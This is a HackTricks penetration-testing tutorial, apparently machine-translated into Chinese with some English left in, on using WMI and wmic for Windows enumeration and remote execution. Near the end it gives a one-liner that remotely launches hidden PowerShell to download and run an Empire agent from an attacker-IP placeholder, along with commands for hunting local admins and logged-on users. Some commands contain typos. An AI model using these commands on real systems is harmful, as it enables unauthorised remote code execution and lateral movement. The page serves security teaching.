# WmicExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**telegram群组**](https://t.me/peass) 或者 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 它是如何工作的

Wmi允许在你知道用户名/(密码/哈希)的主机上打开进程。然后，Wmiexec使用wmi来执行每个要执行的命令（这就是为什么Wmicexec给你一个半交互式shell）。

**dcomexec.py：**这个脚本提供了一个类似于wmiexec.py的半交互式shell，但是使用不同的DCOM端点（ShellBrowserWindow DCOM对象）。目前，它支持MMC20.应用程序、Shell Windows和Shell Browser Window对象。（来自[这里](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)）

## WMI基础知识

### 命名空间

WMI被划分为一个类似目录的层次结构，根容器\root下有其他目录。这些"目录路径"被称为命名空间。\
列出命名空间：
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
使用以下命令列出命名空间的类：
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **类**

WMI类名，例如：win32\_process，是任何WMI操作的起点。我们始终需要知道类名和所在的命名空间。\
列出以`win32`开头的类：
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
调用一个类：
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### 方法

WMI类具有一个或多个可执行的函数。这些函数被称为方法。
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI枚举

### 检查WMI服务

这是您可以检查WMI服务是否正在运行的方法：
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### 系统信息

To gather system information using WMIC, you can use the following command:

使用WMIC收集系统信息，可以使用以下命令：

```plaintext
wmic os get Caption, Version, OSArchitecture, Manufacturer, BuildNumber
```

This command will retrieve the following information:

该命令将检索以下信息：

- Caption: The name of the operating system.
- Version: The version number of the operating system.
- OSArchitecture: The architecture of the operating system (32-bit or 64-bit).
- Manufacturer: The manufacturer of the operating system.
- BuildNumber: The build number of the operating system.

- Caption：操作系统的名称。
- Version：操作系统的版本号。
- OSArchitecture：操作系统的架构（32位或64位）。
- Manufacturer：操作系统的制造商。
- BuildNumber：操作系统的构建号。

This command can be useful for gathering basic system information during a penetration test or for general system administration tasks.

在渗透测试期间或进行一般系统管理任务时，此命令可用于收集基本系统信息。
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### 进程信息

The `wmic` command in Windows can be used to gather information about running processes. This can be useful for monitoring and troubleshooting purposes. Here are some `wmic` commands that can be used to retrieve process information:

- To list all running processes:
```
wmic process list brief
```

- To filter the list of processes based on a specific criteria, such as the process name:
```
wmic process where "name='process_name'" list brief
```

- To retrieve detailed information about a specific process, such as its command line arguments and execution path:
```
wmic process where "processid='process_id'" get commandline, executablepath
```

- To terminate a process:
```
wmic process where "processid='process_id'" delete
```

Remember to replace `'process_name'` and `'process_id'` with the actual name and ID of the process you want to retrieve information about or terminate.

By using these `wmic` commands, you can gain valuable insights into the processes running on a Windows system and take necessary actions as needed.
```bash
Get-WmiObject win32_process | Select Name, Processid
```
从攻击者的角度来看，WMI在枚举系统或域的敏感信息方面非常有价值。
```
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

```bash
Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **手动远程WMI查询**

例如，这是一种非常隐蔽的方法，可以在远程计算机上发现本地管理员（注意，域是计算机名称）：
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
```
另一个有用的一行命令是查看谁登录到了一台机器上（用于追踪管理员）：
```
wmic /node:ordws01 path win32_loggedonuser get antecedent
```
`wmic`甚至可以从文本文件中读取节点，并在所有节点上执行命令。如果你有一个工作站的文本文件：
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent
```
**我们将通过WMI远程创建一个进程来执行Empire代理：**

```plaintext
wmic /node:TARGET process call create "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Empire.ps1'); Invoke-Empire"
```

这个命令将在目标机器上使用WMI远程创建一个进程，以执行Empire代理。请将`<ATTACKER_IP>`替换为攻击者的IP地址。
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
```
我们看到它成功执行（ReturnValue = 0）。一秒钟后，我们的Empire监听器捕获到它。请注意，进程ID与WMI返回的相同。

所有这些信息都提取自这里：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
